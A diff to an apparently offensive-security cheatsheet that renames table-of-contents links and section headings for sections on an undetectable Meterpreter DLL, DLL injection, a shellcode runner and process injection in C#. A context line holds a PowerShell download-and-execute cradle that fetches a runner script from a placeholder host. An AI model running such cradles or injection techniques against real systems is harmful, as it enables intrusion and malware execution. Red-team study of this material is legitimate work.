@@ -10,9 +10,9 @@ A cheatsheet compiled so you have everything you need in one place. I'd like to 
 [CSharp](#CSharp)
 
 - [Meterpreter_FUD_DLL](##Meterpreter_FUD_DLL)
-- [DLL_Injection]('##DLL Injection')
-## Shellcode Runner
-## Process injection
+- [DLL_Injection](##DLL_Injection)
+- [Shellcode_Runner](##Shellcode_Runner)
+- [Process_injection](##Process_injection)
 
 ***
 # DotNetToJscript
@@ -281,7 +281,7 @@ iex(new-object net.webclient).downloadstring('http://IP:80/runner.ps1')
 <br>
 <br>
 
-## DLL Injection
+## DLL_Injection
 
 ```csharp
 using System;
@@ -347,7 +347,7 @@ addr, 0, IntPtr.Zero);
 <br>
 <br>
 
-## Shellcode Runner
+## Shellcode_Runner
 
 ```csharp
 using System;
@@ -397,7 +397,7 @@ IntPtr.Zero);
 <br>
 <br>
 
-## Process injection
+## Process_injection
 
 ```csharp
 using System;
